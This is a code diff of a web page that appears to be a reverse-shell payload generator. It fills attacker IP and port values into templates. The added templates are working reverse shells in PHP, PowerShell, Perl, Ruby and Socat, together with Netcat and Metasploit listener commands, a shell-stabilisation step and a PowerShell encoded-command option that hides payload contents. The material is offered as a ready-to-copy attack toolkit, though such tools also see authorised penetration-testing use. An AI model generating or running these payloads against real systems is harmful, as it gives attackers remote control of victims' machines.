-                        template: (ip, port) => `# Run on YOUR machine:\nsocat file:\`tty\`,raw,echo=0 TCP-L:${port}`
-                    }
-                ]
+                name: "PHP Socket",
+                platform: "Web",
+                badge: "TCP",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`
             },
             {
-                category: "Listeners (Run on YOUR machine)",
-                items: [
-                    {
-                        name: "Netcat Listener",
-                        badge: "tcp", badgeText: "LISTEN",
-                        template: (ip, port) => `nc -lvnp ${port}`
-                    },
-                    {
-                        name: "rlwrap Listener",
-                        badge: "tcp", badgeText: "LISTEN",
-                        template: (ip, port) => `rlwrap nc -lvnp ${port}`
-                    },
-                    {
-                        name: "Pwncat Listener",
-                        badge: "tcp", badgeText: "LISTEN",
-                        template: (ip, port) => `pwncat-cs -lp ${port}`
-                    },
-                    {
-                        name: "Metasploit Listener",
-                        badge: "tcp", badgeText: "MSF",
-                        template: (ip, port) => `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`
-                    }
-                ]
+                name: "PHP proc_open",
+                platform: "Web",
+                badge: "TCP",
+                badgeClass: "badge-warning",
+                template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${shell}",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`
             },
             {
-                category: "Upgrade to Interactive Shell",
-                items: [
-                    {
-                        name: "Stabilize with Python",
-                        badge: "tcp", badgeText: "PTY",
-                        template: () => `python3 -c 'import pty;pty.spawn("/bin/bash")'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm`
-                    },
-                    {
-                        name: "Stabilize with script",
-                        badge: "tcp", badgeText: "PTY",
-                        template: () => `script -qc /bin/bash /dev/null\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm`
-                    }
-                ]
+                name: "PowerShell IEX",
+                platform: "Windows",
+                badge: "WIN",
+                badgeClass: "badge-secondary",
+                template: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+            },
+            {
+                name: "PowerShell Short",
+                platform: "Windows",
+                badge: "WIN",
+                badgeClass: "badge-secondary",
+                template: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$snb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$client.Close()"`
+            },
+            {
+                name: "Perl",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
+            },
+            {
+                name: "Ruby",
+                platform: "Linux",
+                badge: "TCP",
+                badgeClass: "badge-primary",
+                template: (ip, port, shell) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`
+            },
+            {
+                name: "Socat",
+                platform: "Linux",
+                badge: "TTY",
+                badgeClass: "badge-secondary",
+                template: (ip, port, shell) => `socat TCP:${ip}:${port} EXEC:${shell},pty,stderr,setsid,sigint,sane`
+            },
+            {
+                name: "Netcat Listener",
+                platform: "Listener",
+                badge: "LOCAL",
+                badgeClass: "badge-primary",
+                template: (ip, port) => `nc -lvnp ${port}`
+            },
+            {
+                name: "rlwrap nc",
+                platform: "Listener",
+                badge: "LOCAL",
+                badgeClass: "badge-primary",
+                template: (ip, port) => `rlwrap nc -lvnp ${port}`
+            },
+            {
+                name: "Metasploit Handler",
+                platform: "Listener",
+                badge: "LOCAL",
+                badgeClass: "badge-secondary",
+                template: (ip, port) => `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`
+            },
+            {
+                name: "Python PTY Upgrade",
+                platform: "Upgrade",
+                badge: "PTY",
+                badgeClass: "badge-warning",
+                template: () => `python3 -c 'import pty;pty.spawn("/bin/bash")'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm`
             }
         ];
 
-        function getValues() {
-            return {
-                ip: document.getElementById('ip').value || '10.10.14.1',
-                port: document.getElementById('port').value || '4444',
-                shell: document.getElementById('shellType').value,
-                encoding: document.getElementById('encoding').value
-            };
-        }
+        let currentFilter = 'all';
 
-        function encodePayload(payload, encoding) {
-            if (encoding === 'base64') {
-                try { return btoa(payload); } catch(e) { return payload; }
-            }
-            if (encoding === 'url') return encodeURIComponent(payload);
-            return payload;
-        }
-
-        function highlightCode(code, ip, port) {
-            code = code.replace(new RegExp(ip.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), 
-                `<span class="highlight-ip">${ip}</span>`);
-            code = code.replace(new RegExp(`\\b${port}\\b`, 'g'), 
-                `<span class="highlight-port">${port}</span>`);
-            return code;
+        function showNotification() {
+            const notif = document.getElementById('notification');
+            notif.classList.add('show');
+            setTimeout(() => notif.classList.remove('show'), 2000);
         }
 
         function copyToClipboard(text, btn) {
             navigator.clipboard.writeText(text).then(() => {
-                const orig = btn.innerHTML;
-                btn.innerHTML = '&#10003; Copied!';
                 btn.classList.add('copied');
-                setTimeout(() => {
-                    btn.innerHTML = orig;
-                    btn.classList.remove('copied');
-                }, 2000);
+                showNotification();
+                setTimeout(() => btn.classList.remove('copied'), 2000);
             });
+        }
+
+        function encodePayload(text, encoding) {
+            if (encoding === 'base64') return btoa(text);
+            if (encoding === 'url') return encodeURIComponent(text);
+            if (encoding === 'powershell') {
+                // Special PS encoding for UTF16LE base64
+                let utf16le = "";
+                for (let i = 0; i < text.length; i++) {
+                    utf16le += text[i] + "\0";
+                }
+                return btoa(utf16le);
+            }
+            return text;
+        }
+
+        function filterBy(platform) {
+            currentFilter = platform;
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.textContent.includes(platform) || (platform === 'all' && item.textContent.includes('All'))) {
+                    item.classList.add('active');
+                }
+            });
+            render();
+        }
+
+        function searchPayloads() {
+            render();
         }
 
         function render() {
-            const { ip, port, shell, encoding } = getValues();
-            const container = document.getElementById('shellsContainer');
+            const ip = document.getElementById('ip').value || '10.10.14.1';
+            const port = document.getElementById('port').value || '4444';
+            const shell = document.getElementById('shellType').value;
+            const encoding = document.getElementById('encoding').value;
+            const search = document.getElementById('search').value.toLowerCase();
+            const container = document.getElementById('payloadContainer');
+
             container.innerHTML = '';
 
-            shells.forEach(category => {
-                const catDiv = document.createElement('div');
-                catDiv.className = 'category';
-                catDiv.innerHTML = `<h2><span>//</span> ${category.category}</h2>`;
-                container.appendChild(catDiv);
+            const filtered = payloads.filter(p => {
+                const matchesFilter = currentFilter === 'all' || p.platform === currentFilter;
+                const matchesSearch = p.name.toLowerCase().includes(search) || p.platform.toLowerCase().includes(search);
+                return matchesFilter && matchesSearch;
+            });
 
-                category.items.forEach(item => {
-                    let raw = item.template(ip, port, shell);
-                    let payload = encodePayload(raw, encoding);
-                    
-                    const card = document.createElement('div');
-                    card.className = 'shell-card';
-                    card.innerHTML = `
-                        <div class="shell-header">
-                            <div class="shell-title">
-                                <span class="shell-lang">${item.name}</span>
-                                <span class="shell-badge badge-${item.badge}">${item.badgeText}</span>
-                            </div>
-                            <button class="copy-btn" onclick="copyToClipboard(\`${payload.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`, this)">
-                                &#9112; Copy
-                            </button>
+            filtered.forEach(p => {
+                let text = p.template(ip, port, shell);
+                let display = encodePayload(text, encoding);
+                
+                if (encoding === 'powershell') {
+                    display = `powershell.exe -EncodedCommand ${display}`;
+                }
+
+                const card = document.createElement('div');
+                card.className = 'payload-card';
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div class="card-title">
+                            <h3>${p.name}</h3>
+                            <span class="badge ${p.badgeClass}">${p.badge}</span>
                         </div>
-                        <div class="shell-code">${highlightCode(payload, ip, port)}</div>
-                    `;
-                    container.appendChild(card);
-                });
+                        <span class="badge" style="background: rgba(255,255,255,0.05); color: var(--text-dim)">${p.platform}</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="code-container">${display}</div>
+                        <button class="copy-btn" onclick="copyToClipboard('${display.replace(/'/g, "\\'")}', this)">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                        </button>
+                    </div>
+                `;
+                container.appendChild(card);
             });
         }
 
-        // Re-render on input change
+        // Listeners
         document.getElementById('ip').addEventListener('input', render);
         document.getElementById('port').addEventListener('input', render);
         document.getElementById('shellType').addEventListener('change', render);
         document.getElementById('encoding').addEventListener('change', render);
 
-        // Initial render
+        // Init
         render();
     </script>
 </body>
